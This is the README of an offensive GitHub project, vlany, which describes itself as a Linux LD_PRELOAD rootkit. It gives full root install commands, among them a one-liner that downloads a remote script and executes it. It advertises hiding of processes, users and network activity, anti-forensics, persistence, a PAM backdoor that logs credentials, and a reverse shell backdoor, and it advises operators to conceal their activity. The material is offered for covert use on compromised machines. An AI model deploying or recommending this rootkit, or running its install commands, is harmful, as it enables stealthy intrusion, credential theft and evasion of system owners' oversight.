# VLANY IS NO LONGER MAINTAINED.
# https://github.com/naworkcaj/bdvl IS. PLEASE REFER TO THAT FOR CONSTANT UPDATES.

# vlany ([wiki](https://github.com/mempodippy/vlany/wiki))
#### *vlany is a Linux LD_PRELOAD rootkit*.</br>
 * *[List of features](https://github.com/mempodippy/vlany/wiki/Features)*</br>
 * *[Anti-Detection](https://github.com/mempodippy/vlany/wiki/Anti-Detection)*

## Installing
 * vlany's [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh) script is the fastest/easiest method of installation.</br>
`root@vlany:~# wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh && chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh`</br></br>
The quick_install.sh script automatically downloads the latest version of vlany from this repository, untars the archive, then executes the regular installation script from a new random directory in /tmp/. By default, the quick_install.sh script removes the new directory once execution has completely finished.</br>

 * It's very simple to install vlany onto a system as it comes with an automated install script.    
To install vlany you want to first download it from our GitHub ( Always up to date and trusted )  
`root@vlany:~# wget https://github.com/mempodippy/vlany/archive/master.tar.gz && tar xvpfz master.tar.gz`

 * Once it's downloaded you just have to run `install.sh` inside vlany-master.   
`root@vlany:~# cd vlany-master && ./install.sh`   
By default this will prompt you with a [tui](https://en.wikipedia.org/wiki/Text-based_user_interface) installation but if cli is prefered you can use the --cli argument to invoke a similar cli installation.</br>

### [ASCIICAST OF INSTALLATION](https://asciinema.org/a/a8u6ca1n2ujmgijgldrcdu425)</br>
Regular tui installation on a Debian 8 box using an suid binary to escalate privileges from a tmp user. In a real life scenario, you'll want to play with some environment variables to prevent anyone from seeing your activity when root.</br>

## Downloads
[quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
[vlany.tar.gz](https://github.com/mempodippy/vlany/archive/master.tar.gz)</br>
[populated const.h](https://raw.githubusercontent.com/mempodippy/vlany/master/symbols/headers/const.h) (after config.py execution)</br>

## Features
  * Process hiding
  * User hiding
  * Network hiding
  * LXC container
  * Anti-Debug
  * Anti-Forensics
  * Persistent (re)installation & Anti-Detection
  * Dynamic linker modifications
  * Backdoors
    * accept() backdoor (derived from Jynx2)
    * PAM backdoor
      * PAM auth logger
    * [snodew reverse shell backdoor](https://github.com/mempodippy/snodew)
  * vlany-exclusive commands

## Known bugs
*Any bugs listed here will be present until a resolve has been reached. If a bug has been reported as an [issue](https://github.com/mempodippy/vlany/issues), the corresponding issue will also be linked in the bug listing. Should a bug be resolved, the listing will be removed from here, and if any issue is still open pertaining to the bug, it will be closed.*
### Serious bugs
> 1. There is currently an experimental reboot brick fix. Some systems will brick, others won't. Please report any systems that brick on reboot as an issue, and give the circumstances of the vlany installation in the report. Take a look at the Issues page to see if a similar issue has already been submitted.
> 2. vlany [fails to install](https://github.com/mempodippy/vlany/issues/5) correctly on anything above CentOS 6.6.

## [In-depth README.txt](https://raw.githubusercontent.com/mempodippy/vlany/master/README_old) (very detailed but not maintained)</br>
**NOTE:** vlany is in active development. Changes are constantly being made to this repository, so beware that vlany is very experimental.
<!-- LAPTOPS CANNOT RUN, THEY ARE LAPTOPS -->
